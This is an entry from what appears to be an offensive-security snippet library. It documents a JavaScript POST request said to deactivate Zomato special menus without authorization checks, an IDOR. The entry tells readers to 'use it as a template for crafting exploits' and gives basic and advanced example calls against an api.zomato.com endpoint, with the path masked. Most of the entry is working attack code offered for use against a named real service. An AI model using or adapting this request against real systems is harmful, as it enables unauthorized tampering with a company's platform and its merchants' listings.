---
data: >-
  var a={request_type:"deactivate-special-menu",user_id:USER_ID,menu_set_id:e};
  $.post("XXX/XXXXXX")
tags:
  - js
  - api
type: command
executor: javascript
platforms:
  - Web
id: f4f5d36a-61dc-41b7-a165-3f617976a18c
created_at: '2025-12-14T17:25:29.742Z'
updated_at: '2025-12-14T17:25:29.742Z'
verified: false
validated: true
submitted: true
---
# Zomato Deactivate Special Menu JS Snippet

## Command

```javascript
var a={request_type:"deactivate-special-menu",user_id:USER_ID,menu_set_id:e}; $.post("XXX/XXXXXX")
```

## Description

This JavaScript snippet, discovered in Zomato's code, constructs and sends a POST request to deactivate a special menu without authorization checks. Use it as a template for crafting exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user_id | The user identifier | Yes |
| menu_set_id | The ID of the menu set to deactivate (e) | Yes |
| endpoint | The API endpoint ("XXX/XXXXXX") | Yes |
| request_type | Specifies the action ("deactivate-special-menu") | Yes |

## Examples

### Basic Usage

```javascript
var a={request_type:"deactivate-special-menu",user_id:12345,menu_set_id:678}; $.post("https://api.zomato.com/XXX/XXXXXX", a);
```

### Advanced Usage

```javascript
// With error handling
$.post("https://api.zomato.com/XXX/XXXXXX", {request_type:"deactivate-special-menu",user_id:12345,menu_set_id:678}).done(function(data){ console.log("Deactivated:", data); });
```

## Expected Output

Server response confirming deactivation, such as a success JSON or updated menu status.

## Related

- [[Related Procedure: Deactivate-Special-Menu-via-IDOR]]
